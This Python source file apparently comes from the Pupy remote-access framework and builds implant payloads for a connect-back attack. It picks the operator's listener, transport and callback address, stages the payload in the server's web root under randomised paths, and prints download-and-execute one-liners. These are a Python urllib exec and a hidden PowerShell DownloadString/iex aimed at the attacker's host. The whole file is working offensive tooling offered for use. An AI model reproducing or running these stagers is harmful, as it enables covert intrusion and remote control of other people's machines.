# -*- encoding: utf-8 -*-

import os

from pupylib.PupyModule import PupyArgumentParser
from pupylib.PupyOutput import Info, Warn, Success, Error

from pupylib.utils.listener import get_listener_ip, get_listener_port
from pupylib.utils.listener import get_listener_ip_with_local

import pupygen

usage  = 'Generate payload'

def parser(server, handler, config):
    return pupygen.get_parser(PupyArgumentParser, config=config)

def do(server, handler, config, args):
    handler.display(Info("Raw user arguments given for generation: {0}".format(str(args.launcher_args))))
    if not args.launcher:
        handler.display(Info("Launcher/connection method not given. It is set to 'connect' now"))
        args.launcher = 'connect'
    #launcher method 'connect' or 'auto_proxy'
    if args.launcher and args.launcher in ('connect', 'auto_proxy'):
        transport      = None #For saving the transport method (default or given by user)
        transport_idx  = None
        host           = None #Host for listening point (not for launcher args)
        port           = None #Port for listening point (not for launcher args)
        host_idx       = None #For saving host:port from user args (if given by user)
        preferred_ok   = True
        need_transport = False #For appending transport method in launcher args
        need_hostport  = False #For appending host & port for connection back in launcher args

        if args.launcher_args:
            #Some arguments are given in command line, saving host&port and transport method
            total = len(args.launcher_args)
            for idx,arg in enumerate(args.launcher_args):
                if arg == '-t' and idx < total-1:
                    #Manage Transport
                    transport = args.launcher_args[idx+1]
                    transport_idx = idx+1
                    handler.display(Info(
                        "Launcher configuration: Transport for connection back will be set to {0}".format(
                            repr(transport))))
                elif arg == '--host' and idx<total-1:
                    #Manage host & port for connection back
                    host_idx = idx+1
                    hostport = args.launcher_args[host_idx]
                    if ':' in hostport:
                        host, port = hostport.rsplit(':', 1)
                        port = int(port)
                    else:
                        try:
                            port = int(hostport)
                        except:
                            host = hostport
                    handler.display(Info(
                        "Launcher configuration: Host & port for connection back will be set to {0}:{1}".format(
                            host,port)))

        need_transport = not bool(transport)
        need_hostport = not all([host, port])

        #If host, port or transport are missing
        if not all([host, port, transport]):
            default_listener = None
            preferred_ok = False

            if transport:
                #Transport method is given, get the listener
                default_listener = server.listeners.get(transport)
                if not default_listener:
                    handler.display(Error(
                        'Requested transport {} is not active. Will use default'.format(
                            transport)))
                    #We need to save the transport method for the launcher
                    need_transport = True

            if not default_listener:
                try:
                    default_listener = next(server.listeners.itervalues())
                except StopIteration:
                    pass

            if default_listener:
                #We have a listener, we can set host & port
                transport = default_listener.name

                handler.display(Info(
                    'This local listening point will be used: Transport={} Address={}:{}'.format(
                        default_listener.name, default_listener.external,
                        default_listener.external_port)))

                if host or port:
                    handler.display(Warn('Host and port {0}:{1} are ignored for getting the valid local listening point but'.format(host, port)))
                    handler.display(Warn('they are kept for configuring the launcher for connection back'))

                if args.prefer_external != default_listener.local:
                    host = default_listener.external
                    port = default_listener.external_port
                    preferred_ok = True
                    handler.display(Info("Host & port for listening point are set to: {0}:{1}".format(host,port)))
                elif not args.prefer_external and not default_listener.local:
                    host = get_listener_ip(cache=False)
                    port = default_listener.port
                    if host:
                        handler.display(Warn('Using {0}:{1} as local IP:PORT for the local listening point'.format(host, port)))
                    preferred_ok = True
                else:
                    preferred_ok = not (default_listener.local and args.prefer_external)

        #If transport is missing
        if not transport:
            handler.display(Error('No active transport method. You have to explicitly choose one. Impossible to continue.'))
            return

        #If host or port is missing or preferred_ok
        if not all([host, port, preferred_ok]):
            maybe_port = get_listener_port(config, external=args.prefer_external)
            maybe_host, local = get_listener_ip_with_local(
                external=args.prefer_external,
                config=config, igd=server.igd
            )

            if (not local and args.prefer_external) or not (host and port):
                handler.display(Warn('Using configured/discovered: {0}:{1}'.format(maybe_host, maybe_port)))
                host = maybe_host
                port = maybe_port
            else:
                handler.display(Warn('Unable to find external HOST:PORT'))

        #If need a transport method because not given by user for launcher
        if need_transport:
            if transport_idx is None:
                args.launcher_args += ['-t', transport]
            else:
                args.launcher_args[transport_idx] = transport
            #Transport method not given by user. Consequently,
            handler.display(Info("Transport method {0} appended to launcher args".format(repr(transport))))

        #If host and port are not given/find for connection back
        if need_hostport:
            hostport = '{}:{}'.format(host, port)
            if host_idx is None:
                args.launcher_args += ['--host', hostport]
            else:
                args.launcher_args[host_idx] = hostport
            #Host & port method not given by user. Consequently,
            handler.display(Info("Host & port {0} appended to launcher args".format(repr(hostport))))

    #Enable HTTPD if required
    if server.httpd:
        handler.display(Info("HTTPD enabled"))
        wwwroot = config.get_folder('wwwroot')
        if not args.output_dir:
            args.output_dir = wwwroot

    try:
        output = pupygen.pupygen(args, config, server, handler.display)

    except pupygen.NoOutput:
        return

    except Exception, e:
        handler.display(Error(e, 'payload generation failed'))
        import traceback
        traceback.print_exc()
        return

    if not output and 'oneliner' not in args.format:
        handler.display(Error('payload generation failed'))
        return

    if server.httpd and output.startswith(wwwroot):
        wwwpath = os.path.relpath(output, wwwroot)
        if config.getboolean('httpd', 'secret'):
            wwwpath = '/'.join([
                config.get('randoms', 'wwwsecret', random=5)
            ] + [
                config.set('randoms', None, x, random=5) for x in wwwpath.split('/')
            ])

        handler.display(Success('WWW URI PATH: /{}'.format(wwwpath)))
        host="<host:port>"
        try:
            for i in range(0,len(args.launcher_args)):
                if args.launcher_args[i]=="--host":
                    host=args.launcher_args[i+1]
                    break
        except:
            pass

        if args.format=='py':
            handler.display(Success("ONELINER: python -c 'import urllib;exec urllib.urlopen(\"http://{}/{}\").read()'".format(host, wwwpath)))
        elif args.format=='ps1':
            handler.display(Success("ONELINER: powershell.exe -w hidden -noni -nop -c \"iex(New-Object System.Net.WebClient).DownloadString('http://{}/{}')\"".format(host, wwwpath)))
